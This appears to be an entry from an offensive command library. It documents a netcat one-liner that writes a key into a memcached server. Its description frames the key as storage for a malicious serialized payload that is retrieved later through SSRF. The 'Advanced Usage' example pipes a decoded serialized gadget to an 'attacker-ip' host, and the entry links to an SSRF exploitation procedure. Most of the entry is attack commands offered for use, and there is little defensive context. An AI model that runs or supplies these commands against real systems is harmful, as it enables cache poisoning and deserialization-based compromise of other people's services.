---
id: cmd-uuid-7890
data: echo -e 'set key 0 0 100\r\nPAYLOAD\r\n' | nc ip 11211
tags:
  - memcached
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:32.098Z'
verified: false
validated: true
submitted: true
---
# memcached-set-payload

## Command

```bash
echo -e 'set key 0 0 100\r\nPAYLOAD\r\n' | nc ip 11211
```

## Description

This command uses netcat to set a key-value pair in a memcached server, storing a malicious serialized payload for later retrieval via SSRF.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `set key` | Memcached set command with key name | Yes |
| `0 0 100` | Flags, exptime, bytes | Yes |
| `PAYLOAD` | Binary or base64-encoded serialized data | Yes |
| `nc ip 11211` | Netcat to memcached port | Yes |

## Examples

### Basic Usage

```bash
echo -e 'set test 0 0 10\r\nhello\r\n' | nc localhost 11211
```

### Advanced Usage

```bash
echo -e 'set malicious 0 0 500\r\n$(base64 -d serialized-gadget)\r\n' | nc attacker-ip 11211
```

## Expected Output

' STORED\r\n' from memcached confirming successful set.

## Related

- [[Related Procedure|Exploiting-SSRF-to-Control-Memcached-Data]]
